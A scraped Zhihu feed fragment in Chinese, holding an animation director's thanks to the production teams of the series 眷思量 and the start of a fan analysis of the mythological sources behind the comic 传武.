data-watermark-src=\"v2-1c95e1f1566877e9ae4e3b32d50cbb49\" data-private-watermark-src=\"v2-930ba25728c21932f2188fe405c0f61c\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-97d907a0e33f845658f0869b51908a02_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2555\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-97d907a0e33f845658f0869b51908a02\" data-watermark-src=\"v2-82bdb1b8ed1cddefb2e13c892b34e778\" data-private-watermark-src=\"v2-f123969269bf113cbefc16bcf621e226\"></p>\n<p>编剧组的朋友陪我研究剧本，梳理原著内容逻辑，跨年时还开编剧会到深夜，讨论的乐此不疲。</p>\n<p>制片组的小可爱们细心梳思量每个制作环节的每个细节，事无巨细的盯紧各方面进度，奋战在进度第一线协调各公司，努力保证项目推进效率。</p>\n<p>美术组的小伙伴们配合我一遍遍出服饰构思图，只为接近最贴合原著的角色身份和设计思路。在我选定后又精心绘制服装拆解图，供中期的小伙伴能看明白创意细节才好执行成模型。</p>\n<p>分镜组的小伙伴们在我每次讲戏、分解镜头思路后都快速积极的调整串联，只为达到画面顺畅叙事清晰，让每个角色都有最合适的亮相和剧情情节空间展现他们的喜怒哀乐。</p>\n<p>执行导演们负责将每集每个镜头的各种细节想法事无巨细的还原实施到影片中。对镜头、动画、解算等串联把控都非常尽心尽力。对音乐音效的编排创意也都非常有独到见解。剪辑节奏把控也深得我心～</p>\n<p>还要特别感谢吾立方动画的诸位老铁们！！我和吾立方的胡总渊源颇深，一直是业内互相欣赏、守望相助的动画友人，终于在《少锦》时正式开启合作，并通过通力合作建立了更加深的了解和相互信任，深知他们是一个踏实、负责、专业的团队。因此做《眷思量》的时候，第一时间邀胡总一起合作。</p>\n<p>模型组的小伙伴经常陪我加班到深夜雕模型，我多次龟毛的调整要求他们都没有不耐烦，才让资产能有这样协同统一。</p>\n<p>动画组的小伙伴对我零零碎碎的小要求都尽心尽力完成好，让角色动作真的靠近我心里想的样子。</p>\n<p>灯光组的小伙伴对我们非番剧打光级别的要求和一堆反馈回去的灯光设计图，都有努力执行并且保质保量让人欣喜。</p>\n<p>合成组的小伙伴对素材整合协调，我知道一个特效镜头素材动辄十几个G或者几十个G的文件你们肯定很头痛，但从不跟我抱怨。</p>\n<p>我在工作中的确龟毛要求高，但吾立方各组的小伙伴们都在努力配合我协助完成眷思量的各种环节，真的很感谢吾立方对于炎央文化和眷眷的支持！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f4bf572a9192666641411d3857060570_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f4bf572a9192666641411d3857060570\" data-watermark-src=\"v2-04742be326a8181420eba6076f81c898\" data-private-watermark-src=\"v2-3bb6ae9575e02cf6188a70967e765a87\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c770c22a82439216652d0d272a5a665c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c770c22a82439216652d0d272a5a665c\" data-watermark-src=\"v2-4ff178f6c958848b2b1cc96d4ef8f3ab\" data-private-watermark-src=\"v2-aaa352a3451a303d0b4ab30e8b4c92af\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-30495d54466748b151ea26652f0c068e_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"843\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-30495d54466748b151ea26652f0c068e\" data-watermark-src=\"v2-0d68eb763c066de06a752ac4de3bcccf\" data-private-watermark-src=\"v2-776252e9d69b84b76fa81345577a4017\"></p>\n<p>感谢我的特效指导老师！眷思量里开场及难度最高的特效是找了专门的动画电影特效团队几何二进制做的，他们的特效总监也是眷思量的特效总监郭老师。在电影《哪吒魔童降世》和《姜子牙》里他们都负责了难度最高的特效之一。我与郭老师是一见如故，顺利解决了很多特效难题！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a06787323c135c8c5a62bb6af81c4833_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"697\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a06787323c135c8c5a62bb6af81c4833\" data-watermark-src=\"v2-27b7d17d4da244240ab5b3aba3f9999d\" data-private-watermark-src=\"v2-abbb24633ba9fad4ce864fc6fc473f27\"></p>\n<p>超级感谢我的配音导演姜SIR，作为光合积木的创始人，姜sir尽心尽力的帮我寻找最适合思量的声音。并出色的完成了整部剧配音的指导和设计，让我也从中学到了很多！不愧是我敬重的大神级业界前辈。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-868c5075e6b43d362aa83431df44995a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"940\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-868c5075e6b43d362aa83431df44995a\" data-watermark-src=\"v2-bfcff05abfe409bc52bc5c56ee12fcde\" data-private-watermark-src=\"v2-245d8bafe870e2f2e542736efc9e972a\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-351ea4be2c9e2113cc840c84decc2975_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-351ea4be2c9e2113cc840c84decc2975\" data-watermark-src=\"v2-e8489e53bda3a49ff6145c8b7f53b82d\" data-private-watermark-src=\"v2-6b1186366347b58451b970013cc40ea4\"></p>\n<p>感谢负责音乐制作的作曲家白鸟老师，和白鸟是多年的老朋友了，这次的合作非常和我心意，但把他折腾够呛～～作曲家先生非常敬业优秀的完成了整个OST的创作，每首曲子都描摹出了思量故事里的各种情景。再配上师妹刘美麟的绝美声线献唱，深得我心。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4b791e1fa8fa1da856d8c276c0139ab5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1422\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4b791e1fa8fa1da856d8c276c0139ab5\" data-watermark-src=\"v2-8617ab2fc2982ac7e46e9c587ce30589\" data-private-watermark-src=\"v2-2573e841dd3f976097977772238deb31\"></p>\n<p>当然还有我可爱的量子们，感谢你们的等待。还有给我的贴心留言，支持在默默赶工的我，每次看到这些留言，我就又有赶工的动力。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fd8eb4c688b8c0f3cc12ea61e166e61b_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fd8eb4c688b8c0f3cc12ea61e166e61b\" data-watermark-src=\"v2-ad7f7fb0547e16e7745edbbba0bb62eb\" data-private-watermark-src=\"v2-d7ec33d7d8072c994bba379c12ba775b\"></p>\n<p>然后回到我的专业领域。 第一季我个人其实有不少不满意的地方。但因为时间限制和档期要求，从剧本到最后成片很多方面来不及深抠。而且开始做项目由于能调动的资源太少，且项目没有任何知名度和对人才的吸引力，所以各方面都找不到人帮忙，希望这个情况能在第二季及后续可能进行的大电影制作里根据预算情况逐步改善，争取后面能吸引到喜欢思量的能人加入，把项目做得更好吧。</p>\n<p>以及，不得不提的是，因为思量能不能一直做下去，跟每集播放量正相关，播放量的多少直接关系到后面集数平台宣推资源争取和下一季制作成本的洽谈，所以从现在来看，各方面真的是个未知数。。。我也只能做好我能做到的，其他方面就看造化啦。所以希望喜欢思量的小伙伴们能从通过各种官方渠道支持我们，这样我们才能收到相应收益把项目持续下去，不要去支持盗版TOT做动画真是很非常不易，原创动画更是无比艰难，请大家且看且珍惜~T--T。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-232ef6b5c1fddac649531711b33bad86_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-232ef6b5c1fddac649531711b33bad86\" data-watermark-src=\"v2-23289ef954bb02f19986dde23385b656\" data-private-watermark-src=\"v2-21727b90abf743de42539af321e7ce78\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-dc16a07105de605bb33358e1050fab24_720w.jpg?rss\" data-rawwidth=\"1895\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc16a07105de605bb33358e1050fab24\" data-watermark-src=\"v2-d650246c828be010086a9c47f398392a\" data-private-watermark-src=\"v2-41fe2457cae80a674e181b91c963c64a\"></p>\n<p>最后，我想说的是，不管我能不能争取到继续做下去的资金和资源，都希望现在上线播出的这季作品可以让每个参与过眷思量的人，每个喜欢眷思量的小伙伴，都能说一句——值得！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">15 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266714288?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么我们对过去的动画评价要比现在的好？</a><br><a href=\"http://www.zhihu.com/question/25531649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请评价贱鸡行事系列动画？</a><br>\n","link":"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产漫画《传武》？","date":"2021-07-07 03:00:11","description":"\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《传武》漫画为基础做的简单猜想；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，神魔以及各门派的简介，都是仅在《传武》世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i><br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-c2221ef6c59fff3a021711c42f7e16b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"638\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-c2221ef6c59fff3a021711c42f7e16b8\" data-watermark-src=\"v2-317cee823ac8be9d8a7d33b38a7b3ee5\" data-private-watermark-src=\"\"></p>\n<h2><i>目录</i></h2>\n<p><b><i>引子</i></b></p>\n<p><b><i>《传武》中的神话设定</i></b></p>\n<p><i>1.《西游记》观音小分队的细节</i></p>\n<p><i>2.《封神演义》红尘仙的世俗依靠</i></p>\n<p><i>3.《水浒传》故事背后的故事</i></p>\n<p><i>4.漫画背后的微缩历史</i></p>\n<p><b><i>《传武》中的山海经设定</i></b></p>\n<p><i>1.仁兽驺虞的变态之路</i></p>\n<p><i>2.雁门关外的火凤燎原</i></p>\n<p><i>3.青龙背负的四大灾星</i></p>\n<p><b><i>《传武》中的克苏鲁设定</i></b></p>\n<p><i>1.黄衣之王与他的黄沙眷属</i></p>\n<p><i>2.克苏鲁神话外的克苏鲁</i></p>\n<p><b><i>《传武》中的戏剧化设定</i></b></p>\n<p><i>1.二百年一轮的庄周梦蝶</i></p>\n<p><i>2.樊家的王之宝库</i></p>\n<p><i>3.六道轮回间的相生相克</i></p>\n<p><b><i>个人感想</i></b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2><b>引子</b></h2>\n<p>无论怎么评价，传武注定是一部难以简单概括的作品，这并不是说传武的故事太过复杂，而是从整体的阅读体验来说的；就我个人而言，我一共系统的阅读过三次《传武》；第一次是跟随连载，大概从第一部的白骨洞剧情线一直跟到现在，回过头来看，中间确实会有出现跳戏或者自以为读懂其实不然的情况出现；不过抛开当时对部分细节的错误理解，《传武》也是一部初体验非常爽快的漫画；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-185a3830654f485e0640b2f94588cd66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1158\" data-rawheight=\"386\" data-watermark=\"watermark\" data-original-src=\"v2-185a3830654f485e0640b2f94588cd66\" data-watermark-src=\"v2-821e062317d4f571c50fa31c25fd574a\" data-private-watermark-src=\"v2-5cb568a2186a5ebb92985600ffff268e\"></p>\n<p>第二次就是走的我个人的拉片流程，建立了Excel表格，对漫画中出现的所有的各大门派，各大势力，绝学，法器，红尘仙，山海种，天灾；都做了简单的归类整理，并标注每件事发生的相关剧情信息；这一次我得出的结论是：传武中的故事和架构是要比我想象的更加严谨合理的；剧情其实也并不是我一开始认为的纯线性平铺直叙；而是不同的线在一开始就交织并行了，虽说不上草蛇灰线，但确实处处有伏笔；所有中期出现的关键剧情其实回过头去看在早期也都有隐晦暗示，只不过之前的剧情发展太慢，导致这些优点并不够明显；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3974d99f264c5ae79766b95ad6a7bf66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"294\" data-watermark=\"watermark\" data-original-src=\"v2-3974d99f264c5ae79766b95ad6a7bf66\" data-watermark-src=\"v2-f5ea0270470339ce7bd2757a535f66ff\" data-private-watermark-src=\"\"></p>\n<p>第三次是在QQ群看了星云老师七百多页的剧透之后，去对照之前自己做的那些整理，发现绝大多数是还是能够对上的，而一些之前百思不得其解的事情也得到了解答；就此我认为我对两部传武有了一个较为粗浅的认识；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfcfb37aebebdf2b3702926f17d53ce9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"394\" data-watermark=\"watermark\" data-original-src=\"v2-cfcfb37aebebdf2b3702926f17d53ce9\" data-watermark-src=\"v2-a0b00510ea514cc543d182180ebd4651\" data-private-watermark-src=\"\"></p>\n<h2>《传武》中的神话设定</h2>\n<p>传武中出现最多的，或者说给普通读者最多共鸣的，往往就是传武中出现的那些神话元素，这些元素包括但不限于小说《西游记》；《封神演义》以及《搜神记》《聊斋志异》等志怪小说；这些神话设定一方面丰富了《传武》中此方世界信仰的丰富程度，也在很大一方面降低了部分读者的阅读门槛；使得普通读者在遇到一些细节彩蛋时，也能感受到亲切；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-73d78e8e239c0ad9b844a308b50f09f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-73d78e8e239c0ad9b844a308b50f09f3\" data-watermark-src=\"v2-7801d622463f55458f49a8c9a0aa192c\" data-private-watermark-src=\"\"></p>\n<p><b>1.《西游记》观音小分队的细节</b></p>\n<p>传武中出现的神话设定首屈一指的就是小说《西游记》；由于《传武》中与山阴合作的降世神明都是上界的观音（慈航）选拔的，所以不可避免的这些出现的角色或多或少都和观音或者西游记有一定的联系；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e0bc4892678fce3601b5bcb502a8a298_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-e0bc4892678fce3601b5bcb502a8a298\" data-watermark-src=\"v2-2b5b4012b2e213634e345b0b1b34055a\" data-private-watermark-src=\"\"></p>\n<p>包括但不仅限于在泰安降临的惠安尊者木吒，潍坊的广目天王魔礼寿（原型出自封神）；滨州的灵感大王；淄州的布袋罗汉惧留孙（原型出自封神）；聊城的伏虎罗汉；东阿的慈航道人观世音；天牢中的百目道人；以及严华绝学枯木逢春的祖师地仙镇元子；上清道的祖师清源妙道真君；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cb431606c2bcc3e0126ff67b7dde4809_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"368\" data-watermark=\"watermark\" data-original-src=\"v2-cb431606c2bcc3e0126ff67b7dde4809\" data-watermark-src=\"v2-9a879e851d1466ff2894b137c6389cc0\" data-private-watermark-src=\"\"></p>\n<p>木吒的绝学是纸人法体以及化形出的三十六路天罡刀；这天罡刀就是在《西游记》原著中为帮助唐僧师徒收服红孩儿；木吒向父亲李天王借用的三十六把天罡刀；灵感大王在滨州与六合帮交手前和《西游记》中一样都布置了利于自己的环境；镇元子在《西游记》中也是依靠观音的帮助才使得人参果树起死回生；反而观音的延伸绝学千鬼横行按照星云老师的说法是发现自己的肉有驯服鬼怪的作用，原型更像是传说中的度母观音；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d1996bc79177e5a02262193bd413c567_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-d1996bc79177e5a02262193bd413c567\" data-watermark-src=\"v2-36f77cbc1c98f585f7695104261c2620\" data-private-watermark-src=\"\"></p>\n<p>可以说观音小分队承担了拉近传武世界与现实世界距离的作用；就好比有的人你很多年前就认识，但《传武》给你机会看了他不为人知的另一面；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2e869a3d33b70e55af278a299acb07e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"552\" data-watermark=\"watermark\" data-original-src=\"v2-2e869a3d33b70e55af278a299acb07e2\" data-watermark-src=\"v2-d734ad5eeb88d92733994767525e5b6a\" data-private-watermark-src=\"\"></p>\n<p><b>2.《封神演义》红尘仙的世俗依靠</b></p>\n<p>和《西游记》中的角色紧紧围绕降世观音不同，《封神演义》中出现的神则更多的对应上方的各位仙神；比如惧留孙就曾提到过元始天尊以及玉虚宫；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-19e551802975d77c33b3efccf0f7a089_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"329\" data-watermark=\"watermark\" data-original-src=\"v2-19e551802975d77c33b3efccf0f7a089\" data-watermark-src=\"v2-02c92911d40dbbf843b4bf67b088257e\" data-private-watermark-src=\"\"></p>\n<p>《封神演义》可以说承担了《传武》中大部分的神明体系；这一体系不仅体现在降世神明的口口相传中；哪怕地上的五行门，上清派，都多多少少的变成了这一体系下的衍生物；《传武》中有很多体制；上界的神魔体制；此方世界的六道体制；大汉的世家体制；大唐的山神土地制；大晋的城隍天牢体制；没有规矩不成方圆，神魔小说中必须有一个规矩去划定尺度以至于剧情不陷于无敌对无敌的崩坏泥沼；但是如果规矩太过复杂或者严苛又会形成知识壁垒，把对漫画不那么了解的普通人拦在墙外；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-77ecfa2952447f058dfe11e64605f2b5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"890\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-77ecfa2952447f058dfe11e64605f2b5\" data-watermark-src=\"v2-7c6edd747cdf5066ed9bf9f6db93ced0\" data-private-watermark-src=\"\"></p>\n<p>《传武》比较聪明的调动了大众的公共认识，把我们童年已经构建的那套神魔世界体系在一定的合理化加工后变成一套即能简单上手又经得起推敲琢磨的世界观；可以说，没有《传武》中国孩子心中的这个世界依然存在，而《传武》 的出现，很好的把童年的回忆和我们期待的复杂诡计叙事结合了起来；就像《封神榜》中的漫天星斗，封神之前都要在凡尘中摸爬滚打；所以当看见天上的某颗星才会觉得既崇高又亲切；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b07c386b4555e5e2115d5b6688d94b7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"990\" data-rawheight=\"556\" data-watermark=\"watermark\" data-original-src=\"v2-b07c386b4555e5e2115d5b6688d94b7e\" data-watermark-src=\"v2-0cc665ce24de5c62eb545e9076299153\" data-private-watermark-src=\"\"></p>\n<p><b>3.《水浒传》故事背后的故事</b></p>\n<p>只从个人角度来说，我觉得在《传武》之外，星云老师肯定曾今也构建过一个以《水浒传》为框架的小说或者漫画剧本；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-38418a796ee78ed2e855d78b7df7449e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"323\" data-watermark=\"watermark\" data-original-src=\"v2-38418a796ee78ed2e855d78b7df7449e\" data-watermark-src=\"v2-4e76b251c702a05f768bac3b2bdf827b\" data-private-watermark-src=\"\"></p>\n<p>一方面《传武》中出现那些天罡地煞的形象与名字，如原本就出自水浒的没遮拦穆弘，与水浒形象相似的一丈青姚金秀，以及蓝虎；还有天牢中的昆仑奴石方尊（运气爆表）双面人杨智,小阎王罗正等；其实都有极大的可能是出自星云大佬另外构建的一个世界中的出身角色；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d722a4438af9cfd4d9207c23f90ea9b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"343\" data-watermark=\"watermark\" data-original-src=\"v2-4d722a4438af9cfd4d9207c23f90ea9b\" data-watermark-src=\"v2-3e491b22f8542f7cc46df943bd603783\" data-private-watermark-src=\"\"></p>\n<p>另外还有传武中无处不在的两个设定：有限的一百零八个天灾成道机会，以及朝廷到处收集的星斗仙术资料与天罡地煞术的存在；这里也很想安利一下同样非常优秀的田野一洋老师的《异闻水浒传》和胡伟老师的《长安督武司》；都是在限定了绝学和世界观上限的体系中厮杀的经典漫画；虽然《传武》中因为上方世界的存在，一定程度上削弱了这些下级武人之间拼杀的惨烈；但也能感受到很多可能转瞬即逝的龙套角色，在早期应该都是有属于自己的剧情脉络的；（好比番外篇的中出现的六合帮）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"980\" data-rawheight=\"503\" data-watermark=\"watermark\" data-original-src=\"v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8\" data-watermark-src=\"v2-390d23b86c5620d341b12ec302623fe9\" data-private-watermark-src=\"\"></p>\n<p><b>4.漫画背后的微缩历史</b></p>\n<p>目前《传武》中明确设计的历史有楚汉战争（项羽和樊哙）大汉，颠覆大汉的张角；李世民打造的大唐（山神土地制度）上一世的人屠黄巢等；可以看出来如果二百年前的历史不因为上界的战争发生偏移那《传武》中此方世界的王朝与战争应该是和我们经历的历史高度趋同的；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1cc48689bae6652384149f2f4f14ed29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"858\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-1cc48689bae6652384149f2f4f14ed29\" data-watermark-src=\"v2-70dca6297ac252d3b0cd060e7d39c0d9\" data-private-watermark-src=\"\"></p>\n<p>同样的人物以及背景，虽然被赋予了各种绝学和传承，但是也和那些小说中的彩蛋一样，大大削减了读者的阅读门槛；在这一层上我们可以从一个弈棋者的视角而不是棋子的视角来盛世这些王朝之间的战争；比如祸秧道对王朝道的侵蚀，通过祸根来打造乱世；再比如生死道对其余五道的统治与经营布置；就好比上清道祖师李董说的，只有站在棋盘之上称为拿着棋子的人，才能看见《传武》世界的运行轨迹；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-11d4c67765658396cf7ca8535575ec11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"813\" data-rawheight=\"494\" data-watermark=\"watermark\" data-original-src=\"v2-11d4c67765658396cf7ca8535575ec11\" data-watermark-src=\"v2-87204573ec997e204857a7755bbbdfad\" data-private-watermark-src=\"\"></p>\n<p>这种在完全架空的漫画中引用大量真实历史的文学产品虽然不在少数，比如《高堡奇人》，《祖国》；但像《传武》这样，如此大刀阔斧的在关键历史转折点改变历史轨迹，打造出一个在文化依然封建但是科技水平军事势力都远远高于当时社会的科技与神魔共存的世界的还是比较少见的（可能网络小说中会出现）这种生产认识与技术力的不平衡其本身就是极具戏剧性的；在传武早期还能看到完全出于农耕社会的东阿，聊城；但是到了朱雀的星轨开始这个世界就已经超出了社会自然发展的控制了；就像严华说的上界给这个世界带来了绝学，带来了星轨，带来了玉米；就像是二战后直接被划入全球化的原始社会，虽然大晋依然严格管控着这些变量，但是其中蕴含的变革的力量必将带动剧情的快速发酵；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f46703912b60b19508341b9cbe6b9e1d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"387\" data-watermark=\"watermark\" data-original-src=\"v2-f46703912b60b19508341b9cbe6b9e1d\" data-watermark-src=\"v2-a2b628a55fefb7a8c0edad5850a6588e\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的山海经设定</b></h2>\n<p>传武除了人类社会，其实还有一个比较隐晦的妖怪社会，比如一开始就说起的雁门关外的猰貐；陈兴获得的婴如；若木之种的各种形态；以及那些在千鬼横行中出现的各种天灾鬼患；其实在第一次连载阅读时期就能体验到这里的伏笔，然而在我阅读了星云老师的剧透后，还是觉得是我想的太简单了；山海种和人类之间既有合作共赢的历史（大唐的山神，大晋的山海司）也暗示了很多的种族问题以及人与自然的思辨；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-05791f1d24341abd4d64bb48c6b7799f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"885\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-05791f1d24341abd4d64bb48c6b7799f\" data-watermark-src=\"v2-dd67e889e9929f436ad981eae3cc060c\" data-private-watermark-src=\"\"></p>\n<p><b>1.仁兽驺虞的变态之路</b></p>\n<p>就拿传说中的万物之红尘仙驺虞来说；《传武》中的驺虞最早出自第二卷第125条.经验之谈；是尸鬼一脉的祖先；然而在现实生活中：驺虞是中国古代传说中的一种野兽；一种虎躯猊首，白毛黑纹，尾巴很长的动物，在《神奇动物在哪里》中那个长尾巴的大猫就是驺虞。据说驺虞生性仁慈，连青草也不忍心践踏，不是自然死亡的生物不吃。被文人认为是仁慈之兽；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-64b15292759c46f004ca262bb027694f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-64b15292759c46f004ca262bb027694f\" data-watermark-src=\"v2-5fe60163e54f520fced16752555ac8a3\" data-private-watermark-src=\"\"></p>\n<p>然而当驺虞第一次出现在《传武》世界观中时，他的设定则是尸鬼术的源头，世界僵尸的祖师，是怨恨人类的存在；其实我个人感觉当年此方世界的观音骑着的那只人面神兽应该就是驺虞，也只有山海种中的红尘仙才镇得住九尾狐这样的大妖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-65ecb928bad538207efce2eefe353aa6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1037\" data-rawheight=\"401\" data-watermark=\"watermark\" data-original-src=\"v2-65ecb928bad538207efce2eefe353aa6\" data-watermark-src=\"v2-51449bfad0c18cd06327a6d3b3b335a3\" data-private-watermark-src=\"\"></p>\n<p>其实从后面水镜空间的剧情可以看出，此方世界的观音一直与山海种保持这高度的联系；但是也必然的她应该要为万物道红尘仙驺虞之后的变化附有一定的责任；根据星云老师在暗示中的线索此方世界的观音应该也是最早的绝技红尘仙（早于李董）；我们知道就大晋统治时期，王朝和鬼神的掌道者是站在大晋背后，万物和祸殃的掌道者与大晋对立，生死和奇技的掌道者则选择中立。 那么有没有可能在大汉建立之前除生死道外的五道也经历过某种对立与洗牌呢？（以上都是个人瞎猜，一切以剧情为准）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-58fba9888e986aa8eb2948df93682524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-58fba9888e986aa8eb2948df93682524\" data-watermark-src=\"v2-2a670cf2f0cfe1aecb9fd4301d2c57ad\" data-private-watermark-src=\"\"></p>\n<p><b>2.雁门关外的火凤燎原</b></p>\n<p>《传武》中雁门关外的那只猰貐一直是被不断提起确实又从未正面描述过的存在；我们读者除了知道猰貐很强（朱雀一种在送）且对人类抱有很大的恶意外，也并不知道更多的剧情了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1cbdf63ccf70c408798cfc97005fa299_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"635\" data-watermark=\"watermark\" data-original-src=\"v2-1cbdf63ccf70c408798cfc97005fa299\" data-watermark-src=\"v2-d85adc45536d35d0853a43424bb4c707\" data-private-watermark-src=\"\"></p>\n<p>从星云老师剧透中提到的暗示来看四象各有分工，青龙负责把守天牢；白虎负责处理人形天灾；朱雀负责对敌雁门关的敌人；玄武负责游走于天下捉拿大晋潜在的威胁；其中朱雀掌握的南明离火属于《传武》八大火之一，是作者公认的规格外的存在（相当于隐形轰炸机）我简单在网上看来一下南明离火这个词；不出所料都是比较中二的设定聚合体；不结合现实中的中国历史来看，应该和《斗破苍穹》中的异火一样是特殊的火焰吧；</p>\n<p><img 